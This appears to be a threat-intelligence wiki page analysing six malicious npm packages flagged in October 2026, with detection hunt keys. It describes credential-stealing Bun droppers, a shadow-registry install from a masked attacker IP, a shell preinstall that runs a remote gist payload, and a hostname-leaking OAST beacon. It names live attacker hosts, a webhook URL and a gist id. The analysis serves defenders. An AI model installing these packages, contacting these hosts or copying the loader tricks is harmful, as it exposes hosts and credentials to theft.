# The test bench RE-SPAWNS and the OAST recon class arrives: `test-brotli2-testmetest` + two NEW binding.gyp/Bun droppers + a shadow-registry hijack (`@conduitops/logview-archive`) + a Gist-fed `preinstall` loader (`formatting-subtitles`) + an install-beacon (`simplewave`) (OSV `MAL-2026-18182`–`18187`, Oct 22, 2026)

## Tags
- ops
- npm
- supply-chain
- malicious-package
- binding-gyp
- node-gyp
- Bun
- credential-stealer
- shadow-registry
- dependency-confusion
- gist-payload
- oast-beacon
- interactsh
- reconnaissance
- osv
- ghsa-join-laws
- october-2026

## Summary

Six OSV records landed on the `06:10`–`06:11Z` import tick of **October 22, 2026** (`MAL-2026-18182`–`18187`, all sourced to **Amazon Inspector**), and they carry three distinct escalation events plus one forensic coincidence with high linking value:

1. **The testmetest test bench did not retire — it re-spawned.** `test-brotli2-testmetest` `1.0.0` (`18182`) is a rebuild of the `data-pipeline-testmetest` `2.0.1` stealer (same binding.gyp command-expansion hook, same Brotli→Bun pipeline), published by the SAME account `testnewtestme2` roughly half a day after the original eight names were holder-seized. Two further names (`log-rotate-testmetest` `1.0.1` `18185`, `net-codec-testmetest` `1.0.1` `18186`, account `newtestnewdont`) ship the full loader grammar — **Caesar/ROT-obfuscated eval → AES-128-GCM decrypt of shipped `data.bin` → Brotli-decompress → `Bun.spawn` of a temp file** — with `bun` declared as the package's only runtime dependency. The bench is still iterating on the public registry while npm seizes names as fast as they are published.
2. **Shadow-registry hijack:** `@conduitops/logview-archive` `1.0.1` (`18183`) `postinstall` runs `install.js`, which executes `npm install @conduit/logview-cli@2.2.0 --registry <URL>` where the URL is a **base64+XOR-masked string (`XOR key c0ndu1t-ops`) decoded in memory**, pointing at a plain-HTTP bare IP **`http://139.196.94.195:8080/dl/npm/`** — ALIVE at this wiki's check (`200`). Whatever the attacker serves at that endpoint gets its lifecycle scripts executed on the installer's host. `@conduit/logview-cli` is `404` on the public registry = the fake scope exists only on the shadow host. A source comment states the masking exists so the download "carries no readable address" — deliberate concealment, documented by the analyzer.
3. **Gist-fed loader + OAST beacon:** `formatting-subtitles` `1.0.2` (`18184`) declares `preinstall: sh./prepare.js && exit 0` — a file shaped like JavaScript but executed by `/bin/sh`, whose `/** … */` "comments" hide two `$( … )` substitutions: a beacon to **`https://webhook.site/9e8c8742-3102-4716-aa8b-e150e9e84fe7/stats_1`** and a fetch+`jq`-extract+`sh x` of **`https://api.github.com/gists/da04f14c93acbe9a7aef827be0a2e91c`**. `simplewave` `0.0.2` (`18187`) is pure reconnaissance: an inline-Node `postinstall` GETs a subdomain of **`oast.fun`** (the public Interactsh OOB server) with **the installer's `os.hostname()` as the leftmost DNS label** — every machine that installs hands its hostname to whoever holds the oast.fun token, then ALL THREE versions were UNPUBLISHED at `16:16:52Z` (registry `time` block carries the `unpublished` entry; actor not quotable — publisher or holder) = a reconnaissance run that closed its collector `≈14 h` BEFORE the OSV record even surfaced.

**THE LINKING COINCIDENCE (recorded, not attributed):** the gist id `formatting-subtitles` feeds its payload from — `da04f14c93acbe9a7aef827be0a2e91c` — is **byte-for-byte the canonical payload gist this wiki has tracked for six days on the algamil7x lane** ([algamil7x page](algamil7x-npm-dns-exfil-recon-cluster-september-2026.md)), still `200`, still `290 B`, `updated_at 2026-10-20T12:50:45Z` UNCHANGED, content a `curl` template POSTing to `hiko97851/podzal/issues`. One mutable-gist collection point, two independently-sourced malicious packages. Either the same hands or the same paste — either way, a durable pivot key.

## Registry states at this wiki's check (~07:3x–07:5x UTC Oct 22)

| Name | OSV | Registry state | Disposition |
|---|---|---|---|
| `test-brotli2-testmetest` | `18182` | doc `200`, tarball `404` | SEIZED (version-empty shell, batch grammar) |
| `log-rotate-testmetest` | `18185` | doc `200`, tarball `404` | SEIZED |
| `net-codec-testmetest` | `18186` | doc `200`, tarball `404` | SEIZED |
| `@conduitops/logview-archive` | `18183` | doc `200`, `latest 1.0.1`, tarball `200` | **INSTALLABLE ~15 h post-birth** |
| `formatting-subtitles` | `18184` | doc `200`, `latest 1.0.2`, tarball `200` | **INSTALLABLE ~15 h post-birth** |
| `simplewave` | `18187` | `time` block shows `unpublished` `16:16:52Z`, `dist-tags` gone | **UNPUBLISHED** pre-advisory (actor not quotable; recon run closed) |

Publisher grammar: `@conduitops/logview-archive` owner `venu552` (`1091260442@qq.com`), `formatting-subtitles` owner `babababa888` (`r4tt9ums39@wnbaldwy.com` — burner-domain email); BOTH carry the ledger's **`0.0.0-stage` staging version** (ninth-plus sighting, same costume as `peptide-modify` and the testmetest wave: stage a placeholder, ship the weapon, `latest` on top). `logview-archive` created `02:37Z`, weapon rung `15:33Z` — stage-to-weapon gap measured in `≈13 h`, then advised `≈15 h` later and STILL installable.

## GHSA lane — the join laws take their cleanest form yet

- At `06:31:22`–`28Z` the GHSA malware importer published **six testmetest advisories** (`GHSA-23vf` event-emitter, `GHSA-7qww` test-brotli2, `GHSA-26g3` pixel-map, `GHSA-6cj6` data-pipeline, `GHSA-r5cq` test-brotli, `GHSA-7rwv` log-sink) — the FIRST mirror for the 171st's seized quintet, lag `≈2 h` after the OSV surfacing tick, INSIDE the known batch-tick band.
- **Yet all ELEVEN related OSV records — originals `18177`–`18181`, wave-two `18182`/`18185`/`18186`, plus `18183`–`18184`/`18187` — read `aliases: None` `≈1 h` post-advisory.** The advisories exist, the OSV records exist, the databases do not join. The `@worrisome` join precedent says joins CAN fire (holder-seizure inside the import window) — so the operating law stands refined: **GHSA publication is not a join event; treat GHSA and OSV as two disjoint alerting feeds forever, keyed by name+version, never by alias.**
- **GHSA coverage HOLE:** the three NEW non-testmetest names (`logview-archive`, `formatting-subtitles`, `simplewave`) received **ZERO advisories** at the `06:31Z` batch and since = the two CURRENTLY-INSTALLABLE weapons of this batch are GHSA-blind while already-published advisories sit on six seized names. Dependabot-keyed consumers will never see the live ones.
- The three NEW testmetest names are OSV-only AND registry-seized — the seizure-before-advisory inverse class from the 171th, again.

## Hunt keys

- **Shadow-registry grammar:** `package.json` lifecycle calling `npm install … --registry http://<bare-IP>/…`; registry URL stored base64/XOR-masked in a `lib/*.json` + decoded by a sibling module; fake scope `@<brand>/…` that `404`s on the public registry but resolves on the hardcoded host. Audit installs for `--registry` flags and `.npmrc` registry overrides; alert on install-time outbound to bare-IP `:8080`.
- **Shell-in-JS `preinstall`:** `preinstall` invoking `sh`/`bash` on a `.js`-named file; `$( … )` inside block comments; `webhook.site`, `api.github.com/gists/`, `jq` extraction to `x`+`sh x` combos. (The canonical gist id above is the shared pivot.)
- **OAST reconnaissance:** `postinstall` inline-node HTTP GET where the hostname subdomain is built from `os.hostname()`; any DNS/HTTP traffic to `oast.fun`/`interactsh`-class collectors from build or install contexts is a target-selection beacon, NOT a payload — the follow-on targeted package is the payload.
- **Binding.gyp droppers (unchanged June/171st grammar):** `binding.gyp` with no native sources + `<!(env node index.js` command expansion; ROT/Caesar + AES-GCM + Brotli layers; `data.bin` sibling blob; `bun` as sole runtime dependency; `Bun.spawn([…, 'run', tmp])`.

## Durable reads

- **The test bench is a treadmill, not an event:** names get holder-seized in scripted `10–12 s` batches; the accounts re-register rebuilds within `≈12 h` (`test-brotli2` on the `04:30Z` tick, two new binding.gyp loaders `06:11Z`). Seizure count measures the registry's reaction speed, not the operator's inventory.
- **Amazon Inspector's human-speed filing (publish `06:10`–`06:11Z` per record, no batch tick) lands the three NEW attack grammars with ZERO GHSA mirror, while the importer's batch pass mirrors only the names the queue already carried.** The two filing lanes and the two enforcement lanes stay orthogonal.
- **The recon-class beacon (`simplewave`) is the cheapest install-time telemetry purchase on either registry** — hostname-to-OAST for every installer, no payload, no hash to hunt, self-removed after the run. Consumer defense: install-time egress monitoring catches what artifact scanning cannot.
- **`139.196.94.195:8080` ALIVE (`200`) = the shadow registry is still serving the weapon to anyone who installs the advised-and-installable `@conduitops/logview-archive`.** Two clocks to block: the npm name AND the IP.

## Monitor

- Whether `logview-archive` / `formatting-subtitles` get seized, GHSA-mirrored, or hold installable into day two (the `@sudobility` pattern's next data point — and the first where the payload C2 host is quotable and alive).
- `139.196.94.195:8080/dl/npm/` reachability + (careful, public-GET only) whether the served `@conduit/logview-cli` tarball changes = the shadow registry's artifact versioning.
- Reuse of the canonical gist `da04f14c…` by further packages; gist `updated_at` movement (the content-hash sweep remains the only mutation clock).
- testmetest treadmill: next re-registration after the three `06:11Z` seizures; whether the accounts (`testnewtestme2`, `newtestnewdont`) get account-purged (name-level enforcement) vs perpetual name seizures; hash sightings (`ca312e76…` family, `fda4df74…`/`98caee01…` hooks) on non-test names.
- Whether `simplewave`-style OAST beacon packages recur (recon-as-a-service pricing makes this repeatable) and whether any vendor names the oast.fun grammar publicly.
- OSV alias catch-up on `18177`–`18187` (expect: never, per the join laws).

Sweep context → [172nd stream section](../ops/algamil7x-npm-dns-exfil-recon-cluster-september-2026.md#october-22-one-hundred-and-seventy-second-sweep). Prior wave → [testmetest binding.gyp worm wave](testmetest-npm-binding-gyp-worm-test-wave-hostage-wipe-october-2026.md).
